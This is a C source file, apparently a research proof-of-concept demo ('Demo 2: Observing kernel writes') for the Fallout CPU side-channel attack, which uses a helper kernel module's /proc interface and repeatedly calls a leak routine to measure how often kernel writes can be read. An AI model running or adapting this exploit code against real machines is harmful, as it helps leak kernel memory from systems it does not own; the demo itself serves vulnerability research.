#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <unistd.h>
#include "../primitives/basic_primitives.h"
#define REPS 20000
#define PROC_FILENAME "/proc/fallout_interface"


int main(int argc, char** args){
    if(access(PROC_FILENAME, F_OK)){
        printf("The Fallout kernel module does not seem to be loaded. Make sure that you load 'kernel_module/fallout_module.ko' before running this demo!\n");
        return 1;
    }
    int procfile = open(PROC_FILENAME, O_RDONLY);
    if(procfile < 0){
        printf("Failed to open the /proc file. Are you root?\n");
        return 1;
    }
    printf("Demo 2: Observing kernel writes\n");
    int page_size = getpagesize();
    uint8_t *mem = aligned_alloc(page_size,page_size * 256);
    memset(mem, 0xFF, page_size * 256);
    fallout_init();
    int reps = REPS, success = 0;
    printf("Attempting %d random reads...\n", reps);
    while (reps--){
        success += kernel_wtf(mem, procfile);
    }
    close(procfile);
    printf("%d of %d reads succeeded.\nSuccess rate: %.2f %%\n", success, REPS, ((double) success * 100) / REPS);
    fallout_cleanup();
    return 0;
}

